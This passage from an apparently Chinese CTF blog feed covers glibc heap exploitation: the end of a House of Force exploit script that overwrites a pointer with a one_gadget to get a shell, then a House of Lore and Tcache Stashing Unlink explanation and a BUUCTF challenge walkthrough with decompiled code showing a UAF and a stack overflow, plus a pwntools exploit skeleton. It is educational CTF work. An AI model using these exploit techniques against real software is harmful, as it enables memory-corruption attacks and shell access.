class="hljs-string">'system'</span>)<br>lg(<span class="hljs-string">'libc_base'</span>,(libc_base))<br>lg(<span class="hljs-string">'system_addr'</span>,(system_addr))<br>edit(<span class="hljs-number">1</span>,p32(system_addr) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br><span class="hljs-string">'''</span><br>#本地<br>one_gadget = [<span class="hljs-number">0x3ac3c</span>,<span class="hljs-number">0x3ac3e</span>,<span class="hljs-number">0x3ac42</span>,<span class="hljs-number">0x3ac49</span>,<span class="hljs-number">0x5faa5</span>,<span class="hljs-number">0x5faa6</span>]<br>libc = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span>)<br><span class="hljs-meta">#buu远程</span><br>#one_gadget = [<span class="hljs-number">0x3a80c</span>,<span class="hljs-number">0x3a80e</span>,<span class="hljs-number">0x3a812</span>,<span class="hljs-number">0x3a819</span>,<span class="hljs-number">0x5f065</span>,<span class="hljs-number">0x5f066</span>]<br><span class="hljs-meta">#libc = ELF(<span class="hljs-string">'../../libc-2.23.so--32'</span>)</span><br>libc_base = __libc_start_main_addr - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]<br>onegadget = one_gadget[<span class="hljs-number">3</span>] + libc_base<br>edit(<span class="hljs-number">1</span>,p32(onegadget) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br><span class="hljs-meta">#getshell</span><br>delete(<span class="hljs-number">1</span>)<br>itr()<br>main()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-Of-Force2&quot;&gt;&lt;a href=&quot;#House-Of-Force2&quot; class=&quot;headerlink&quot; title=&quot;House Of Force2&quot;&gt;&lt;/a&gt;House Of Force2&lt;/h1&gt;&lt;p&gt;基于top chunk分配机制的利用</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Lore</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Lore/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Lore/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:35.067Z</updated>
    
    <content type="html"><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p><p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p><h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p></blockquote><h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote><p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p></blockquote><p>利用前提</p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.能控制 Small <span class="hljs-keyword">Bin </span>Chunk 的 <span class="hljs-keyword">bk </span>指针。<br><br><span class="hljs-number">2</span>.程序可以越过Tache取Chunk。(使用calloc即可做到)<br><br><span class="hljs-number">3</span>.程序至少可以分配两种不同大小且大小为unsorted <span class="hljs-keyword">bin的Chunk。</span><br></code></pre></td></tr></tbody></table></figure><h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">void</span> __fastcall __noreturn main(char *<span class="hljs-built_in">a1</span>, char **<span class="hljs-built_in">a2</span>, char **<span class="hljs-built_in">a3</span>)<br>{<br>  char <span class="hljs-built_in">v3</span>[<span class="hljs-number">268</span>]<span class="hljs-comment">; // [rsp+0h] [rbp-110h] BYREF</span><br>  int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+10Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  sub_11D5()<span class="hljs-comment">;</span><br>  sub_1450()<span class="hljs-comment">;</span><br>  sub_1269()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>      {<br>        menu()<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">v4</span> = readd()<span class="hljs-comment">;</span><br>        <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">3</span> )<br>          break<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        edit(<span class="hljs-built_in">v3</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>      }<br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &gt; <span class="hljs-number">3</span> )<br>        break<span class="hljs-comment">;</span><br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> == <span class="hljs-number">1</span> )<br>      {<br>        <span class="hljs-meta">if</span> ( x1c &lt;= <span class="hljs-number">0</span> )<br>          exitt()<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        add(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>        --x1c<span class="hljs-comment">;</span><br>      }<br>      <span class="hljs-meta">else</span><br>      {<br>        <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">2</span> )<br>          goto LABEL_19<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        delete(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>      }<br>    }<br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> == <span class="hljs-number">5</span> )<br>      exitt()<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &lt; <span class="hljs-number">5</span> )<br>    {<br>      <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>      show(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>    }<br>    <span class="hljs-meta">else</span><br>    {<br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">666</span> )<br><span class="hljs-symbol">LABEL_19:</span><br>        exitt()<span class="hljs-comment">;</span><br>      stack_attack(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_1515</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v4 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): "</span>);<br>  v3 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>  {<br>    size = <span class="hljs-number">0xF0</span>;<br>  }<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>  {<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      size = <span class="hljs-number">0x300</span>;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">4</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_14;<br>      size = <span class="hljs-number">0x400</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>    {<br>LABEL_14:<br>      size = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    }<br>    size = <span class="hljs-number">16</span>;<br>  }<br>LABEL_15:<br>  <span class="hljs-keyword">if</span> ( size != <span class="hljs-number">0x10</span> &amp;&amp; size != <span class="hljs-number">0xF0</span> &amp;&amp; size != <span class="hljs-number">0x300</span> &amp;&amp; size != <span class="hljs-number">0x400</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  *(<span class="hljs-number">16LL</span> * v4 + a1) = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, size);<br>  *(a1 + <span class="hljs-number">16LL</span> * v4 + <span class="hljs-number">8</span>) = size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input content: "</span>);<br>  v2 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-number">16LL</span> * v4 + a1), *(<span class="hljs-number">16LL</span> * v4 + a1 + <span class="hljs-number">8</span>));<br>  <span class="hljs-keyword">if</span> ( v2 &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  *(v2 - <span class="hljs-number">1LL</span> + *(<span class="hljs-number">16LL</span> * v4 + a1)) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">delete</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v2 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x10</span> || !*(<span class="hljs-number">16LL</span> * v2 + a1) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">free</span>(*(<span class="hljs-number">16LL</span> * v2 + a1));                      <span class="hljs-comment">// uaf</span><br>                                                <span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __fastcall sub_1740(__int64 <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>{<br>  void *<span class="hljs-built_in">v2</span><span class="hljs-comment">; // rsi</span><br>  int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+18h] [rbp-8h]</span><br>  unsigned int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-meta">if</span> ( qword_4010 &lt;= <span class="hljs-number">0</span> )<br>    exitt(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  --qword_4010<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Please input the red packet idx: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = readd()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v5</span> &gt; <span class="hljs-number">0x10</span> <span class="hljs-title">||</span> !*(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>) )<br>    exitt(<span class="hljs-string">"Please input the red packet idx: "</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Please input content: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v2</span> = *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = read(<span class="hljs-number">0</span>, <span class="hljs-built_in">v2</span>, *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span> + <span class="hljs-number">8</span>))<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &lt;= <span class="hljs-number">0</span> )<br>    exitt(<span class="hljs-number">0</span>LL, <span class="hljs-built_in">v2</span>)<span class="hljs-comment">;</span><br>  *(<span class="hljs-built_in">v4</span> - <span class="hljs-number">1</span>LL + *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>)) = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  return puts(<span class="hljs-string">"Done!"</span>)<span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_184E</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v2 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x10</span> || !*(<span class="hljs-number">16LL</span> * v2 + a1) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">puts</span>(*(<span class="hljs-number">16LL</span> * v2 + a1));<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">sub_13BD</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( *(first_chunk + <span class="hljs-number">2048</span>) &lt;= <span class="hljs-number">0x7F0000000000</span>LL || *(first_chunk + <span class="hljs-number">2040</span>) || *(first_chunk + <span class="hljs-number">2056</span>) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You get red packet!"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"What do you want to say?"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x90</span>uLL);<br>}<br></code></pre></td></tr></tbody></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p><h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <br><br><span class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>)<br>#sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-string">'27283'</span>)<br><br>libc=ELF(<span class="hljs-string">"./libc-2.29.so"</span>)<br><br> <br> <br><br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims    :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br> <br><br>def <span class="hljs-built_in">add</span>(<span class="hljs-built_in">index</span>,chunk_size_index,value):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'1'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)<br>    <span class="hljs-keyword">sl</span>(str(chunk_size_index))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input content: '</span>)<br>    <span class="hljs-keyword">sl</span>(value)<br><br>def free(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'2'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>,value):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'3'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input content: '</span>)<br>    <span class="hljs-keyword">sl</span>(value)<br><br>def show(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'4'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br></code></pre></td></tr></tbody></table></figure><h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#<span class="hljs-number">1.0</span>x10 <span class="hljs-number">2.0</span>xf0 <span class="hljs-number">3.0</span>x300 <span class="hljs-number">4.0</span>x400<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_15'</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">15</span>)<br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-string">'Chunk_14'</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">14</span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p 